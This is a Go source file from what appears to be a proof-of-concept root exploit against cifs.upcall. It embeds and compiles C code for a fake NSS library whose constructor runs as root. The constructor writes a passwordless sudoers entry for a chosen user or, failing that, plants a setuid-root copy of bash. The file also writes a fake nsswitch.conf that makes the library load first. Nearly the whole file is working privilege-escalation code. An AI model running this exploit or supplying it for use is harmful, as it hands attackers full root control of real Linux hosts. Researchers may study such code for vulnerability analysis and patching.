package main

// Fake NSS library compilation and nsswitch.conf setup.
//
// libnss_pwn.so.2 is a C shared library with an __attribute__((constructor))
// that fires as soon as dlopen() loads it. Because cifs.upcall calls getpwuid()
// via NSS before calling setuid(), the constructor runs with root privileges.

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// C source for the fake NSS library. @@...@@ placeholders are replaced at runtime.
const libnssSourceTemplate = `
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <nss.h>
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define EVIDENCE_PATH    @@EVIDENCE_PATH@@
#define SUDOERS_PATH     @@SUDOERS_PATH@@
#define SUDOERS_USER     @@SUDOERS_USER@@
#define ROOT_SHELL_PATH  @@ROOT_SHELL_PATH@@

static void write_all(int fd, const char *buf, size_t len)
{
	while (len) {
		ssize_t r = write(fd, buf, len);
		if (r <= 0) return;
		buf += r; len -= (size_t)r;
	}
}

static void create_fallback_root_shell(int logfd)
{
	int ifd = open("/bin/bash", O_RDONLY | O_CLOEXEC);
	if (ifd < 0) return;
	int ofd = open(ROOT_SHELL_PATH,
	               O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 04755);
	if (ofd < 0) { close(ifd); return; }
	char buf[8192]; ssize_t n;
	while ((n = read(ifd, buf, sizeof(buf))) > 0)
		write_all(ofd, buf, (size_t)n);
	fchown(ofd, 0, 0);
	fchmod(ofd, 04755);
	fsync(ofd); close(ofd); close(ifd);
	if (logfd >= 0)
		dprintf(logfd, "created fallback root shell: %s\n", ROOT_SHELL_PATH);
}

__attribute__((constructor))
static void pwn_constructor(void)
{
	int logfd = open(EVIDENCE_PATH,
	                 O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0644);
	if (logfd >= 0)
		dprintf(logfd, "attacker NSS loaded by cifs.upcall\n");

	mkdir("/etc/sudoers.d", 0755);

	int sfd = open(SUDOERS_PATH,
	               O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0440);
	if (sfd < 0) {
		if (logfd >= 0)
			dprintf(logfd, "failed to open sudoers %s errno=%d\n",
			        SUDOERS_PATH, errno);
		create_fallback_root_shell(logfd);
		if (logfd >= 0) close(logfd);
		return;
	}

	const char *comment = "# cifswitch-go poc; remove after testing\n";
	write_all(sfd, comment, strlen(comment));
	dprintf(sfd, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", SUDOERS_USER);
	fchmod(sfd, 0440);
	fsync(sfd); close(sfd);

	if (logfd >= 0) {
		dprintf(logfd, "wrote sudoers entry: %s\n", SUDOERS_PATH);
		close(logfd);
	}
}

enum nss_status _nss_pwn_getpwuid_r(uid_t uid2, struct passwd *pw,
                                    char *buf, size_t buflen, int *errnop)
{
	const char *name = "root", *gecos = "root",
	           *dir  = "/root", *sh   = "/bin/bash";
	size_t need = strlen(name)+strlen(gecos)+strlen(dir)+strlen(sh)+4;
	if (buflen < need) { *errnop = ERANGE; return NSS_STATUS_TRYAGAIN; }
	char *p = buf;
#define CP(f, s) strcpy(p, s); pw->f = p; p += strlen(p)+1
	CP(pw_name,  name);
	CP(pw_gecos, gecos);
	CP(pw_dir,   dir);
	CP(pw_shell, sh);
	pw->pw_passwd = (char *)"x";
	pw->pw_uid = uid2; pw->pw_gid = 0;
	*errnop = 0;
	return NSS_STATUS_SUCCESS;
}
`

// compileFakeNSS substitutes placeholders and compiles libnss_pwn.so.2.
func compileFakeNSS() error {
	src := libnssSourceTemplate
	src = strings.ReplaceAll(src, "@@EVIDENCE_PATH@@", cLiteral(evidencePath))
	src = strings.ReplaceAll(src, "@@SUDOERS_PATH@@", cLiteral(sudoersPath))
	src = strings.ReplaceAll(src, "@@SUDOERS_USER@@", cLiteral(sudoersUser))
	src = strings.ReplaceAll(src, "@@ROOT_SHELL_PATH@@", cLiteral(rootShellPath))

	srcFile := filepath.Join(workDir, "libnss_pwn.c")
	if err := os.WriteFile(srcFile, []byte(src), 0644); err != nil {
		return fmt.Errorf("write NSS source: %w", err)
	}

	outFile := filepath.Join(fakeLibDir, "libnss_pwn.so.2")
	cmd := exec.Command("gcc",
		"-Wall", "-Wextra",
		"-shared", "-fPIC",
		"-nostartfiles",
		"-o", outFile, srcFile)
	if out, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("gcc: %w\n%s", err, out)
	}
	return nil
}

// writeNSSwitchConf writes the fake nsswitch.conf that puts "pwn" first.
func writeNSSwitchConf() error {
	content := "passwd: pwn files\ngroup: files\nshadow: files\nhosts: files dns\n"
	return os.WriteFile(filepath.Join(workDir, "nsswitch.conf"), []byte(content), 0644)
}

// cLiteral converts s to a C string literal (quoted and escaped).
func cLiteral(s string) string {
	s = strings.ReplaceAll(s, `\`, `\\`)
	s = strings.ReplaceAll(s, `"`, `\"`)
	return `"` + s + `"`
}
